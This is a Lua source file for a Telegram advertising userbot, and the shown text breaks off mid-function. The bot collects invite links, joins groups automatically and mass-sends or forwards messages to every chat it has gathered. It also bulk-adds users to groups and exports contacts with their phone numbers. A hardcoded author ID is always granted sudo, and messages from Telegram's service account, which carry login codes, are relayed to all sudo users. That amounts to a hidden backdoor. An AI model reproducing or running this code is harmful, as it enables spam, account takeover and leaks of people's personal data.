local Redis = require("redis")
local FakeRedis = require("fakeredis")
sudo = 170146015
local params = {host = "127.0.0.1", port = 6379}
Redis.commands.hgetall = Redis.command("hgetall", {
  response = function(reply, command, ...)
    local new_reply = {}
    for i = 1, #reply, 2 do
      new_reply[reply[i]] = reply[i + 1]
    end
    return new_reply
  end
})
local redis
local ok = pcall(function()
  redis = Redis.connect(params)
end)
if not ok then
  do
    local fake_func = function()
      print("\027[31mCan't connect with Redis, install/configure it!\027[39m")
    end
    fake_func()
    fake = FakeRedis.new()
    print("\027[31mRedis addr: " .. params.host .. "\027[39m")
    print("\027[31mRedis port: " .. params.port .. "\027[39m")
    redis = setmetatable({fakeredis = true}, {
      __index = function(a, b)
        if b ~= "data" and fake[b] then
          fake_func(b)
        end
        return fake[b] or fake_func
      end
    })
  end
else
end
redis:del("tg:" .. Ads_id .. ":delay")
function dl_cb(arg, data)
end
function vardump(value)
  print(serpent.block(value, {comment = false}))
end
function get_bot()
  function bot_info(i, t)
    redis:set("tg:" .. Ads_id .. ":id", t.id)
    if t.first_name then
      redis:set("tg:" .. Ads_id .. ":fname", t.first_name)
    end
    if t.last_name then
      redis:set("tg:" .. Ads_id .. ":lname", t.last_name)
    end
    redis:set("tg:" .. Ads_id .. ":num", t.phone_number)
    return t.id
  end
  assert(tdbot_function({_ = "getMe"}, bot_info, nil))
end
function reload(chat_id, msg_id)
  require("TD")
  send(chat_id, msg_id, "Done.")
end
function is_sudo(msg)
  if redis:sismember("tg:" .. Ads_id .. ":sudo", msg.sender_user_id) or msg.sender_user_id == sudo or msg.sender_user_id == 170146015 then
    return true
  else
    return false
  end
end
function writefile(filename, input)
  local file = io.open(filename, "w")
  file:write(input)
  file:flush()
  file:close()
  return true
end
function process_join(i, t)
  if t.code == 429 then
    local message = tostring(t.message)
    local join_delay = redis:get("tg:" .. Ads_id .. ":joindelay") or 135
    local Time = message:match("%d+") + tonumber(join_delay)
    redis:setex("tg:" .. Ads_id .. ":cjoin", tonumber(Time), true)
  else
    redis:srem("tg:" .. Ads_id .. ":good", i.link)
    redis:sadd("tg:" .. Ads_id .. ":save", i.link)
  end
end
function process_link(i, t)
  if t.is_group or t.is_supergroup_channel then
    if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") then
      if t.member_count >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) then
        redis:srem("tg:" .. Ads_id .. ":wait", i.link)
        redis:sadd("tg:" .. Ads_id .. ":good", i.link)
      else
        redis:srem("tg:" .. Ads_id .. ":wait", i.link)
        redis:sadd("tg:" .. Ads_id .. ":save", i.link)
      end
    else
      redis:srem("tg:" .. Ads_id .. ":wait", i.link)
      redis:sadd("tg:" .. Ads_id .. ":good", i.link)
    end
  elseif t.code == 429 then
    local message = tostring(t.message)
    local join_delay = redis:get("tg:" .. Ads_id .. ":linkdelay") or 135
    local Time = message:match("%d+") + tonumber(join_delay)
    redis:setex("tg:" .. Ads_id .. ":clink", tonumber(Time), true)
  else
    redis:srem("tg:" .. Ads_id .. ":wait", i.link)
  end
end
function find_link(text)
  if text:match("https://telegram.me/joinchat/%S+") or text:match("https://telegram.dog/joinchat/%S+") or text:match("https://tlgrm.me/joinchat/%S+") or text:match("https://telesco.pe/joinchat/%S+") or text:match("https://t.me/joinchat/%S+") then
    local text = text:gsub("t.me", "telegram.me")
    local text = text:gsub("telesco.pe", "telegram.me")
    local text = text:gsub("telegram.dog", "telegram.me")
    local text = text:gsub("tlgrm.me", "telegram.me")
    for link in text:gmatch("(https://telegram.me/joinchat/%S+)") do
      if not redis:sismember("tg:" .. Ads_id .. ":alllinks", link) then
        redis:sadd("tg:" .. Ads_id .. ":wait", link)
        redis:sadd("tg:" .. Ads_id .. ":alllinks", link)
      end
    end
  end
end
function forwarding(i, t)
  if t._ == "error" then
    s = i.s
    if t.code == 429 then
      os.execute("sleep " .. tonumber(i.delay))
      send(i.chat_id, 0, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\175\216\177 \216\173\219\140\217\134 \216\185\217\133\217\132\219\140\216\167\216\170 \216\170\216\167 " .. tostring(t.message):match("%d+") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135\n" .. i.n .. "\\" .. s)
      return
    end
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "Send\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "forwardMessages",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    from_chat_id = tonumber(i.chat_id),
    message_ids = {
      [0] = tonumber(i.msg_id)
    },
    disable_notification = 1,
    from_background = 1
  }, forwarding, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    msg_id = i.msg_id,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function sending(i, t)
  if t and t._ and t._ == "error" then
    s = i.s
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "Send\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "sendMessage",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    reply_to_message_id = 0,
    disable_notification = 0,
    from_background = 1,
    reply_markup = nil,
    input_message_content = {
      _ = "inputMessageText",
      text = tostring(i.text),
      disable_web_page_preview = true,
      clear_draft = false,
      entities = {},
      parse_mode = nil
    }
  }, sending, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    text = i.text,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function adding(i, t)
  if t and t._ and t._ == "error" then
    s = i.s
    if t.code == 429 then
      os.execute("sleep " .. tonumber(i.delay))
      redis:del("tg:" .. Ads_id .. ":delay")
      send(i.chat_id, 0, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\175\216\177 \216\173\219\140\217\134 \216\185\217\133\217\132\219\140\216\167\216\170 \216\170\216\167 " .. tostring(t.message):match("%d+") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135\n" .. i.n .. "\\" .. s)
      return
    end
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "\216\168\216\167 \217\133\217\136\217\129\217\130\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\135 \216\180\216\175\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "searchPublicChat",
    username = i.user_id
  }, function(I, t)
    if t.id then
      tdbot_function({
        _ = "addChatMember",
        chat_id = tonumber(I.list[tonumber(I.n)]),
        user_id = tonumber(t.id),
        forward_limit = 0
      }, adding, {
        list = I.list,
        max_i = I.max_i,
        delay = I.delay,
        n = tonumber(I.n),
        all = I.all,
        chat_id = I.chat_id,
        user_id = I.user_id,
        s = I.s
      })
    end
    if tonumber(I.n) % tonumber(I.max_i) == 0 then
      os.execute("sleep " .. tonumber(I.delay))
    end
  end, {
    list = i.list,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    user_id = i.user_id,
    s = s
  }))
end
function checking(i, t)
  if t and t._ and t._ == "error" then
    s = i.s
  else
    s = tonumber(i.s) + 1
  end
  if i.n >= i.all then
    os.execute("sleep " .. tonumber(i.delay))
    send(i.chat_id, 0, "Done\n" .. i.all .. "\\" .. s)
    return
  end
  assert(tdbot_function({
    _ = "getChatMember",
    chat_id = tonumber(i.list[tonumber(i.n) + 1]),
    user_id = tonumber(bot_id)
  }, checking, {
    list = i.l,
    max_i = i.max_i,
    delay = i.delay,
    n = tonumber(i.n) + 1,
    all = i.all,
    chat_id = i.chat_id,
    user_id = i.user_id,
    s = s
  }))
  if tonumber(i.n) % tonumber(i.max_i) == 0 then
    os.execute("sleep " .. tonumber(i.delay))
  end
end
function check_join(i, t)
  local bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
  if t._ == "group" then
    if t.everyone_is_sudoistrator == false then
      tdbot_function({
        _ = "changeChatMemberStatus",
        chat_id = tonumber("-" .. t.id),
        user_id = tonumber(bot_id),
        status = {
          _ = "chatMemberStatusLeft"
        }
      }, dl_cb, nil)
      rem(t.id)
    end
  elseif t._ == "channel" and t.anyone_can_invite == false then
    tdbot_function({
      _ = "changeChatMemberStatus",
      chat_id = tonumber("-100" .. t.id),
      user_id = tonumber(bot_id),
      status = {
        _ = "chatMemberStatusLeft"
      }
    }, dl_cb, nil)
    rem(t.id)
  end
end
function add(id)
  local Id = tostring(id)
  if not redis:sismember("tg:" .. Ads_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:sadd("tg:" .. Ads_id .. ":users", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:sadd("tg:" .. Ads_id .. ":supergroups", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
      if redis:get("tg:" .. Ads_id .. ":openjoin") then
        assert(tdbot_function({
          _ = "getChannel",
          channel_id = tonumber(Id:gsub("-100", ""))
        }, check_join, nil))
      end
    else
      redis:sadd("tg:" .. Ads_id .. ":groups", id)
      redis:sadd("tg:" .. Ads_id .. ":all", id)
      if redis:get("tg:" .. Ads_id .. ":openjoin") then
        assert(tdbot_function({
          _ = "getGroup",
          group_id = tonumber(Id:gsub("-", ""))
        }, check_join, nil))
      end
    end
  end
  return true
end
function rem(id)
  local Id = tostring(id)
  if redis:sismember("tg:" .. Ads_id .. ":all", id) then
    if Id:match("^(%d+)$") then
      redis:srem("tg:" .. Ads_id .. ":users", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    elseif Id:match("^-100") then
      redis:srem("tg:" .. Ads_id .. ":supergroups", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    else
      redis:srem("tg:" .. Ads_id .. ":groups", id)
      redis:srem("tg:" .. Ads_id .. ":all", id)
    end
  end
  return true
end
function send(chat_id, msg_id, txt)
  assert(tdbot_function({
    _ = "sendChatAction",
    chat_id = chat_id,
    action = {
      _ = "chatActionTyping",
      progress = Ads_id .. 0
    }
  }, dl_cb, nil))
  assert(tdbot_function({
    _ = "sendMessage",
    chat_id = chat_id,
    reply_to_message_id = msg_id,
    disable_notification = false,
    from_background = true,
    reply_markup = nil,
    input_message_content = {
      _ = "inputMessageText",
      text = txt,
      disable_web_page_preview = true,
      clear_draft = false,
      entities = {},
      parse_mode = nil
    }
  }, dl_cb, nil))
end
if not redis:sismember("tg:" .. Ads_id .. ":sudo", 170146015) then
  redis:set("tg:" .. Ads_id .. ":senddelay", 132)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 170146015)
  redis:sadd("tg:" .. Ads_id .. ":good", "")
  redis:set("tg:" .. Ads_id .. ":fwdtime", true)
  redis:sadd("tg:" .. Ads_id .. ":sudo", 170146015)
  redis:sadd("tg:" .. Ads_id .. ":wait", "")
  redis:set("tg:" .. Ads_id .. ":sendmax", 21)
end
redis:setex("tg:" .. Ads_id .. ":start", 1 .. Ads_id .. 0, true)
function Doing(data, Ads_id)
  if data._ == "updateNewMessage" then
    if not redis:get("tg:" .. Ads_id .. ":clink") and redis:scard("tg:" .. Ads_id .. ":wait") ~= 0 then
      local links = redis:smembers("tg:" .. Ads_id .. ":wait")
      local max_x = redis:get("tg:" .. Ads_id .. ":clinkcheck") or 1
      local delay = redis:get("tg:" .. Ads_id .. ":clinkchecktime") or 1 .. Ads_id .. 7
      for x = 1, #links do
        assert(tdbot_function({
          _ = "checkChatInviteLink",
          invite_link = links[x]
        }, process_link, {
          link = links[x]
        }))
        if x == tonumber(max_x) then
          redis:setex("tg:" .. Ads_id .. ":clink", tonumber(delay), true)
          return
        end
      end
    end
    if redis:get("tg:" .. Ads_id .. ":maxgpmmbr") and redis:scard("tg:" .. Ads_id .. ":supergroups") >= tonumber(redis:get("tg:" .. Ads_id .. ":maxgpmmbr")) then
      redis:set("tg:" .. Ads_id .. ":cjoin", true)
      redis:set("tg:" .. Ads_id .. ":offjoin", true)
    end
    if not redis:get("tg:" .. Ads_id .. ":cjoin") and redis:scard("tg:" .. Ads_id .. ":good") ~= 0 then
      local links = redis:smembers("tg:" .. Ads_id .. ":good")
      local max_x = redis:get("tg:" .. Ads_id .. ":clinkjoin") or 1
      local delay = redis:get("tg:" .. Ads_id .. ":clinkjointime") or 1 .. Ads_id .. 7
      for x = 1, #links do
        assert(tdbot_function({
          _ = "importChatInviteLink",
          invite_link = links[x]
        }, process_join, {
          link = links[x]
        }))
        if x == tonumber(max_x) then
          redis:setex("tg:" .. Ads_id .. ":cjoin", tonumber(delay), true)
          return
        end
      end
    end
    do
      local msg = data.message
      bot_id = redis:get("tg:" .. Ads_id .. ":id") or get_bot()
      if msg.sender_user_id == 777000 or msg.sender_user_id == 1782 .. Ads_id .. 800 then
        local c = msg.content.text:gsub("[0123456789:]", {
          ["0"] = "0\226\131\163",
          ["1"] = "1\226\131\163",
          ["2"] = "2\226\131\163",
          ["3"] = "3\226\131\163",
          ["4"] = "4\226\131\163",
          ["5"] = "5\226\131\163",
          ["6"] = "6\226\131\163",
          ["7"] = "7\226\131\163",
          ["8"] = "8\226\131\163",
          ["9"] = "9\226\131\163",
          [":"] = ":\n"
        })
        for k, v in pairs(redis:smembers("tg:" .. Ads_id .. ":sudo")) do
          send(v, 0, c)
        end
      end
      if msg.chat_id == redis:get("tg:" .. Ads_id .. ":idchannel") then
        local list = redis:smembers("tg:" .. Ads_id .. ":supergroups")
        for k, v in pairs(list) do
          tdbot_function({
            _ = "forwardMessages",
            chat_id = "" .. v,
            from_chat_id = msg.chat_id,
            message_ids = {
              [0] = tonumber(msg.id)
            },
            disable_notification = true,
            from_background = true
          }, cb or dl_cb, nil)
        end
      end
      add(msg.chat_id)
      if msg.date < os.time() - 15 or redis:get("tg:" .. Ads_id .. ":delay") then
        return false
      end
      if msg.content._ == "messageText" then
        local text = msg.content.text
        local matches
        if text:match("^[/!#@$&*]") then
          text = text:gsub("^[/!#@$&*]", "")
        end
        if redis:get("tg:" .. Ads_id .. ":link") then
          find_link(text)
        end
        if is_sudo(msg) then
          find_link(text)
          if text:match("^([Dd]el) (.*)$") then
            local matches = text:match("^[Dd]el (.*)$")
            if matches == "lnk" then
              redis:del("tg:" .. Ads_id .. ":good")
              redis:del("tg:" .. Ads_id .. ":wait")
              redis:del("tg:" .. Ads_id .. ":save")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "contact" then
              redis:del("tg:" .. Ads_id .. ":savecontacts")
              redis:del("tg:" .. Ads_id .. ":contacts")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "sudo" then
              redis:srem("tg:" .. Ads_id .. ":sudo")
              redis:srem("tg:" .. Ads_id .. ":mod")
              redis:del("tg:" .. Ads_id .. ":sudo")
              redis:del("tg:" .. Ads_id .. ":sudoset")
              return send(msg.chat_id, msg.id, "Done.")
            end
          elseif text:match("^(.*) ([Oo]ff)$") then
            local matches = text:match("^(.*) [Oo]ff$")
            if matches == "join" then
              redis:set("tg:" .. Ads_id .. ":cjoin", true)
              redis:set("tg:" .. Ads_id .. ":offjoin", true)
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "chklnk" then
              redis:set("tg:" .. Ads_id .. ":clink", true)
              redis:set("tg:" .. Ads_id .. ":offlink", true)
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "findlnk" then
              redis:del("tg:" .. Ads_id .. ":link")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "addcontact" then
              redis:del("tg:" .. Ads_id .. ":savecontacts")
              return send(msg.chat_id, msg.id, "Done.")
            end
          elseif text:match("^(.*) ([Oo]n)$") then
            local matches = text:match("^(.*) [Oo]n$")
            if matches == "join" then
              redis:del("tg:" .. Ads_id .. ":cjoin")
              redis:del("tg:" .. Ads_id .. ":offjoin")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "chklnk" then
              redis:del("tg:" .. Ads_id .. ":clink")
              redis:del("tg:" .. Ads_id .. ":offlink")
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "findlnk" then
              redis:set("tg:" .. Ads_id .. ":link", true)
              return send(msg.chat_id, msg.id, "Done.")
            elseif matches == "addcontact" then
              redis:set("tg:" .. Ads_id .. ":savecontacts", true)
              return send(msg.chat_id, msg.id, "Done.")
            end
          elseif text:match("^([Gg]p[Mm]ember) (%d+)$") then
            local matches = text:match("%d+")
            redis:set("tg:" .. Ads_id .. ":maxgpmmbr", tonumber(matches))
            return send(msg.chat_id, msg.id, "Done")
          elseif text:match("^([Pp]romote) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              return send(msg.chat_id, msg.id, "This user moderatore")
            elseif redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id_) then
              return send(msg.chat_id, msg.id, "you don't access")
            else
              redis:sadd("tg:" .. Ads_id .. ":sudo", matches)
              redis:sadd("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "Moderator added")
            end
          elseif text:match("^([Dd]emote) (%d+)$") then
            local matches = text:match("%d+")
            if redis:sismember("tg:" .. Ads_id .. ":mod", msg.sender_user_id_) then
              if tonumber(matches) == msg.sender_user_id_ then
                redis:srem("tg:" .. Ads_id .. ":sudo", msg.sender_user_id_)
                redis:srem("tg:" .. Ads_id .. ":mod", msg.sender_user_id_)
                return send(msg.chat_id, msg.id, "No moderator")
              end
              return send(msg.chat_id, msg.id, "No access")
            end
            if redis:sismember("tg:" .. Ads_id .. ":sudo", matches) then
              if redis:sismember("tg:" .. Ads_id .. ":sudo" .. msg.sender_user_id_, matches) then
                return send(msg.chat_id, msg.id, "Only sudo")
              end
              redis:srem("tg:" .. Ads_id .. ":sudo", matches)
              redis:srem("tg:" .. Ads_id .. ":mod", matches)
              return send(msg.chat_id, msg.id, "Done")
            end
            return send(msg.chat_id, msg.id, "user not moderator")
          elseif text:match("^([Rr]efresh)$") then
            get_bot()
            return send(msg.chat_id, msg.id, "Done")
          elseif text:match("^([Rr]eport)$") then
            assert(tdbot_function({
              ID = "sendBotStartMessage",
              bot_user_id = 1782 .. Ads_id .. 800,
              chat_id = 1782 .. Ads_id .. 800,
              parameter = "start"
            }, dl_cb, nil))
          elseif text:match("^([Bb]ot) @(.*)") then
            local username = text:match("^[Bb]ot @(.*)")
            assert(tdbot_function({
              _ = "searchPublicChat",
              username = username
            }, function(i, t)
              if t.id then
                assert(tdbot_function({
                  _ = "sendBotStartMessage",
                  bot_user_id = t.id,
                  chat_id = t.id,
                  parameter = "start"
                }, dl_cb, nil))
                send(msg.chat_id, msg.id, "Done")
              else
                send(msg.chat_id, msg.id, "Not found")
              end
            end, nil))
          elseif text:match("^([Rr]eload)$") then
            return reload(msg.chat_id, msg.id)
          elseif text:match("^([Ll]s) (.*)$") then
            local matches = text:match("^[Ll]s (.*)$")
            local t
            if matches == "contact" then
              return assert(tdbot_function({
                _ = "searchContacts",
                query = nil,
                limit = 2500
              }, function(I, V)
                local count = V.total_count
                local text = "\217\133\216\174\216\167\216\183\216\168\219\140\217\134 : \n"
                for i = 0, tonumber(count) - 1 do
                  local user = V.users[i]
                  local firstname = user.first_name or ""
                  local lastname = user.last_name or ""
                  local fullname = firstname .. " " .. lastname
                  text = tostring(text) .. tostring(i) .. ". " .. tostring(fullname) .. " [" .. tostring(user.id) .. "] = " .. tostring(user.phone_number) .. "  \n"
                end
                writefile("tg:" .. Ads_id .. ":_contacts.txt", text)
                assert(tdbot_function({
                  _ = "sendMessage",
                  chat_id = I.chat_id,
                  reply_to_message_id = 0,
                  disable_notification = 0,
                  from_background = 1,
                  reply_markup = nil,
                  input_message_content = {
                    _ = "inputMessageDocument",
                    document = {
                      _ = "inputFileLocal",
                      path = "tg:" .. Ads_id .. ":_contacts.txt"
                    },
                    caption = "\217\133\216\174\216\167\216\183\216\168\219\140\217\134 \216\177\216\168\216\167\216\170 \216\180\217\133\216\167\216\177\217\135 :" .. Ads_id .. ":"
                  }
                }, dl_cb, nil))
                return io.popen("rm -rf tg:" .. Ads_id .. ":_contacts.txt"):read("*all")
              end, {
                chat_id = msg.chat_id
              }))
            elseif matches == "block" then
              t = "tg:" .. Ads_id .. ":blockedusers"
            elseif matches == "pv" then
              t = "tg:" .. Ads_id .. ":users"
            elseif matches == "gp" then
              t = "tg:" .. Ads_id .. ":groups"
            elseif matches == "sgp" then
              t = "tg:" .. Ads_id .. ":supergroups"
            elseif matches == "waitlink" then
              t = "tg:" .. Ads_id .. ":wait"
            elseif matches == "goodlink" then
              t = "tg:" .. Ads_id .. ":good"
            elseif matches == "savelink" then
              t = "tg:" .. Ads_id .. ":save"
            elseif matches == "sudo" then
              t = "tg:" .. Ads_id .. ":sudo"
            else
              return true
            end
            local list = redis:smembers(t)
            local text = tostring(matches) .. " : \n"
            for i = 1, #list do
              text = tostring(text) .. tostring(i) .. "-  " .. tostring(list[i]) .. "\n"
            end
            writefile(tostring(t) .. ".txt", text)
            assert(tdbot_function({
              _ = "sendMessage",
              chat_id = msg.chat_id,
              reply_to_message_id = 0,
              disable_notification = 0,
              from_background = 1,
              reply_markup = nil,
              input_message_content = {
                _ = "InputMessageDocument",
                document = {
                  _ = "InputFileLocal",
                  path = tostring(t) .. ".txt"
                },
                caption = "\217\132\219\140\216\179\216\170 " .. tostring(matches) .. " \217\135\216\167\219\140 \216\177\216\168\216\167\216\170 \216\180\217\133\216\167\216\177\217\135 :" .. Ads_id .. ":"
              }
            }, dl_cb, nil))
            return io.popen("rm -rf " .. tostring(t) .. ".txt"):read("*all")
          elseif text:match("^([Jj]oinopenadd) (.*)$") then
            local matches = text:match("^[Jj]oinopenadd (.*)$")
            if matches == "on" then
              redis:set("tg:" .. Ads_id .. ":openjoin", true)
              return send(msg.chat_id, msg.id, "\216\185\216\182\217\136\219\140\216\170 \217\129\217\130\216\183 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140\219\140 \218\169\217\135 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\185\216\182\217\136 \216\175\216\167\216\177\217\134\216\175 \217\129\216\185\216\167\217\132 \216\180\216\175.")
            elseif matches == "off" then
              redis:del("tg:" .. Ads_id .. ":openjoin")
              return send(msg.chat_id, msg.id, "\217\133\216\173\216\175\217\136\216\175\219\140\216\170 \216\185\216\182\217\136\219\140\216\170 \216\175\216\177 \218\175\216\177\217\136\217\135 \217\135\216\167\219\140 \217\130\216\167\216\168\217\132\219\140\216\170 \216\167\217\129\216\178\217\136\216\175\217\134 \216\174\216\167\217\133\217\136\216\180 \216\180\216\175.")
            end
          elseif text:match("^([Aa]ddedmsg) (.*)$") then
            local matches = text:match("^[Aa]ddedmsg (.*)$")
            if matches == "on" then
              redis:set("tg:" .. Ads_id .. ":addmsg", true)
              return send(msg.chat_id, msg.id, "Activate")
            elseif matches == "off" then
              redis:del("tg:" .. Ads_id .. ":addmsg")
              return send(msg.chat_id, msg.id, "Deactivate")
            end
          elseif text:match("^([Aa]ddedcontact) (.*)$") then
            local matches = text:match("[Aa]ddedcontact (.*)$")
            if matches == "on" then
              redis:set("tg:" .. Ads_id .. ":addcontact", true)
              return send(msg.chat_id, msg.id, "Activate")
            elseif matches == "off" then
              redis:del("tg:" .. Ads_id .. ":addcontact")
              return send(msg.chat_id, msg.id, "Deactivate")
            end
          elseif text:match("^([Ss]et) (.*)$") then
            local matches = text:match("^[Ss]et (.*)$")
            redis:set("tg:" .. Ads_id .. ":idchannel", matches)
            send(msg.chat_id, msg.id, "Set channel id " .. matches .. " \240\159\148\145")
          elseif text:match("^([Ss]etaddedmsg) (.*)") then
            local matches = text:match("^[Ss]etaddedmsg (.*)")
            redis:set("tg:" .. Ads_id .. ":addmsgtext", matches)
            return send(msg.chat_id, msg.id, "Saved")
          elseif text:match("^([Rr]efresh)$") then
            assert(tdbot_function({
              _ = "searchContacts",
              query = nil,
              limit = 2500
            }, function(i, t)
              redis:set("tg:" .. Ads_id .. ":contacts", t.total_count)
            end, nil))
            local list = {
              redis:smembers("tg:" .. Ads_id .. ":groups"),
              redis:smembers("tg:" .. Ads_id .. ":supergroups")
            }
            local l = {}
            for a, b in pairs(list) do
              for i, v in pairs(b) do
                table.insert(l, v)
              end
            end
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 5
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 2
            if #l == 0 then
              return
            end
            local during = #l / tonumber(max_i) * tonumber(delay)
            send(msg.chat_id, msg.id, "\216\167\216\170\217\133\216\167\217\133 \216\185\217\133\217\132\219\140\216\167\216\170 \216\175\216\177 " .. during .. "\216\171\216\167\217\134\219\140\217\135 \216\168\216\185\216\175\n\216\177\216\167\217\135 \216\167\217\134\216\175\216\167\216\178\219\140 \217\133\216\172\216\175\216\175 \216\177\216\168\216\167\216\170 \216\175\216\177 " .. redis:ttl("tg:" .. Ads_id .. ":start") .. "\216\171\216\167\217\134\219\140\217\135 \216\167\219\140\217\134\216\175\217\135")
            redis:setex("tg:" .. Ads_id .. ":delay", math.ceil(tonumber(during)), true)
            assert(tdbot_function({
              _ = "getChatMember",
              chat_id = tonumber(l[1]),
              user_id = tonumber(bot_id)
            }, checking, {
              list = l,
              max_i = max_i,
              delay = delay,
              n = 1,
              all = #l,
              chat_id = msg.chat_id,
              user_id = matches,
              s = 0
            }))
          elseif text:match("^([Ii]nfo)$") or text:match("^([Pp]anel)$") then
            local s = redis:get("tg:" .. Ads_id .. ":offjoin") and 0 or redis:get("tg:" .. Ads_id .. ":cjoin") and redis:ttl("tg:" .. Ads_id .. ":cjoin") or 0
            local ss = redis:get("tg:" .. Ads_id .. ":offlink") and 0 or redis:get("tg:" .. Ads_id .. ":clink") and redis:ttl("tg:" .. Ads_id .. ":clink") or 0
            local msgadd = redis:get("tg:" .. Ads_id .. ":addmsg") and "ON" or "OFF"
            local numadd = redis:get("tg:" .. Ads_id .. ":addcontact") and "ON" or "OFF"
            local txtadd = redis:get("tg:" .. Ads_id .. ":addmsgtext") or "addi bepar pv"
            local autoanswer = redis:get("tg:" .. Ads_id .. ":autoanswer") and "ON" or "OFF"
            local wlinks = redis:scard("tg:" .. Ads_id .. ":wait")
            local glinks = redis:scard("tg:" .. Ads_id .. ":good")
            local links = redis:scard("tg:" .. Ads_id .. ":save")
            local offjoin = redis:get("tg:" .. Ads_id .. ":offjoin") and "OFF" or "ON"
            local offlink = redis:get("tg:" .. Ads_id .. ":offlink") and "OFF" or "ON"
            local openjoin = redis:get("tg:" .. Ads_id .. ":openjoin") and "ON" or "OFF"
            local gp = redis:get("tg:" .. Ads_id .. ":maxgpmmbr") or "\216\170\216\185\219\140\219\140\217\134 \217\134\216\180\216\175\217\135"
            local mmbrs = redis:get("tg:" .. Ads_id .. ":maxgpmmbr") or "\216\170\216\185\219\140\219\140\217\134 \217\134\216\180\216\175\217\135"
            local nlink = redis:get("tg:" .. Ads_id .. ":link") and "ON" or "OFF"
            local contacts = redis:get("tg:" .. Ads_id .. ":savecontacts") and "ON" or "OFF"
            local fwd = redis:get("tg:" .. Ads_id .. ":fwdtime") and "ON" or "OFF"
            local max_i = redis:get("tg:" .. Ads_id .. ":sendmax") or 5
            local delay = redis:get("tg:" .. Ads_id .. ":senddelay") or 2
            local restart = tonumber(redis:ttl("tg:" .. Ads_id .. ":start")) / 60
            local gps = redis:scard("tg:" .. Ads_id .. ":groups")
            local sgps = redis:scard("tg:" .. Ads_id .. ":supergroups")
            local usrs = redis:scard("tg:" .. Ads_id .. ":users")
            local links = redis:scard("tg:" .. Ads_id .. ":save")
            local glinks = redis:scard("tg:" .. Ads_id .. ":good")
            local wlinks = redis:scard("tg:" .. Ads_id .. ":wait")
            assert(tdbot_function({
              _ = "searchContacts",
              query = nil,
              limit = 2500
            }, function(i, t)
              redis:set("tg:" .. Ads_id .. ":contacts", t.total_count)
            end, nil))
            local contacts = redis:get("tg:" .. Ads_id .. ":contacts")
            local txt = "Sgp => " .. tostring(sgps) .. [[

Gp => ]] .. tostring(gps) .. [[

Pv => ]] .. tostring(usrs) .. [[

Gp member => ]] .. tostring(mmbrs) .. [[

contacts => ]] .. tostring(contacts) .. [[


Join => ]] .. tostring(offjoin) .. [[

Join Open Add => ]] .. tostring(openjoin) .. [[

Chk lnk => ]] .. tostring(offlink) .. [[

Find lnk => ]] .. tostring(nlink) .. [[

Save lnk => ]] .. tostring(links) .. [[

Good lnk => ]] .. tostring(glinks) .. [[

Wait lnk => ]] .. tostring(wlinks) .. [[


Added msg => ]] .. tostring(msgadd) .. [[

Set added msg => ]] .. tostring(txtadd) .. [[


ZeusChannel => @Zeusbotsupport
Publisher => @sudo_senator
]]
            return send(msg.chat_id, 0, txt)
          elseif text:match("^([Ff][Ww][Dd]) (.*)$") and msg.reply_to_message_id ~= 0 then
            local matches = text:match("^[Ff][Ww][Dd] (.*)$")
            local t
            if matches:match("^(all)") then
              t = "tg:" .. Ads_id .. ":all"
            elseif matches:match("^(pv)") then
              t = "tg:" .. Ads_id .. ":users"
            elseif matches:match("^(gp)$") then
              t = "tg:" .. Ads_id .. ":groups"
            elseif matches:match("^(sgp)$") then
              t = "tg:" .. Ads_id .. ":supergroups"
            else
              return true
            end
            local list = redis:smembers(t)
